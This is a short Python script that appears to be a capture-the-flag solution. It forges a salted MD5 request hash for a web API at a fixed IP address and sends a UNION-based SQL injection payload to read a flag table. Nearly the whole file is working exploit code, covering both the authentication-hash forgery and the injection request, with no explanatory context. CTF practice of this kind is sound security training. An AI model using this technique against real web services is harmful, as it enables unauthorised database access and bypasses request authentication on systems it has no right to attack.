import hashlib
import time
import requests
import urllib

md5 = lambda x: hashlib.md5(x).hexdigest()
timestamp = int(time.time())
timestamp = 1489815617

sess = requests.Session()

hash = lambda input, timestamp: md5(md5('Start_here_')[6:6+16] + input + ' This_is_salt' + str(timestamp))
print hash('1337', timestamp)
print md5('d727d11f6d284a0d1337 This_is_salt1489815617')

def go(id):
	URL = 'http://202.120.7.213:11181/api.php'
	ts = int(time.time())
	data = {
		"id": id,
		"hash": hash(id, ts),
		"time": ts
	}
	r = sess.get(URL + "?" + urllib.urlencode(data))
	print r.text

go("-1 union select 1, hey from fl4g#")
